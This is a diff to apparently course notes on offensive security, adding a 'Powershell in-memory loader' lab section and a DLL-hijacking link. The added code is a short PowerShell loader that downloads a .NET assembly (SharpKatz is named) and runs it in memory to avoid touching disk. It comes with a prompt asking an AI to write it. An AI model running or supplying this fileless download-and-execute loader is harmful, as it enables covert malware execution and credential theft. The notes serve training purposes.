@@ -1868,6 +1868,21 @@ string
 <p><a href="https://mbaedev.notion.site/ELI5-Reflection-Shellcode-Runner-in-PowerShell-1e7229403c6980d085cde7f5b029803c">https://mbaedev.notion.site/ELI5-Reflection-Shellcode-Runner-in-PowerShell-1e7229403c6980d085cde7f5b029803c</a></p>
 <p>dot-net execute</p>
 <h1><a class="header" href="#lab---ps-loader" id="lab---ps-loader">Lab - PS Loader</a></h1>
+<h1><a class="header" href="#powershell-in-memory-loader-1" id="powershell-in-memory-loader-1">Powershell in-memory loader</a></h1>
+<blockquote>
+<p>ADVANTAGES of .net binaries -&gt; can be loaded and executed completely in-memory (fileless)</p>
+</blockquote>
+<p>Powershell loader - load assembly (sharpkatz)</p>
+<blockquote>
+<p>AI PROMPT : write a powershell script that downloads a .dotnet binary from a remote website, and then loads it in memory with loadassembly and execute, without anything touching disk, in as few linnes as possible</p>
+</blockquote>
+<pre><code class="language-powershell">$binaryUrl = &quot;https://example.com/sample.dll&quot;
+$bytes = (New-Object System.Net.WebClient).DownloadData($binaryUrl)
+$asm = [System.Reflection.Assembly]::Load($bytes)
+$asm.GetType(&quot;SampleNamespace.SampleClass&quot;).GetMethod(&quot;Main&quot;).Invoke($null, $null)
+</code></pre>
+<p><a href="https://mbaedev.notion.site/ELI5-Reflection-Shellcode-Runner-in-PowerShell-1e7229403c6980d085cde7f5b029803c">https://mbaedev.notion.site/ELI5-Reflection-Shellcode-Runner-in-PowerShell-1e7229403c6980d085cde7f5b029803c</a></p>
+<p>dot-net execute</p>
 <h1><a class="header" href="#static-analysis" id="static-analysis">Static Analysis</a></h1>
 <blockquote>
 <p><strong>TL;DR</strong> In this chapter we'll have a look at basic signature based AV evasion techniques. We'll use <code>strings.exe</code> and <code>yara</code> to explain the basic principles of pattern matching and modify existing malicious tools to bypass signature based detections.</p>
@@ -3295,6 +3310,7 @@ BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved) {
 </code></pre>
 <h1><a class="header" href="#dll-hijacking" id="dll-hijacking">DLL Hijacking</a></h1>
 <p>onedrive -&gt; Appdata -&gt; cscapi.dll</p>
+<p><a href="https://hijacklibs.net/">https://hijacklibs.net/</a></p>
 <p>https://juggernaut-sec.com/dll-hijacking/#Hijacking_the_Service_DLL_to_get_a_SYSTEM_Shell</p>
 <p><img src="./images/dllsearch.jpg" alt="image" /></p>
 <h1><a class="header" href="#scheduled-tasks" id="scheduled-tasks">SCHEDULED TASKS</a></h1>
